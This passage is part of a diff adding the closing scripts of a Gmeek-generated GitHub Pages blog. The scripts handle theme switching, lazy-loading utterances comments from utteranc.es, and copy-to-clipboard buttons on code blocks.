+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
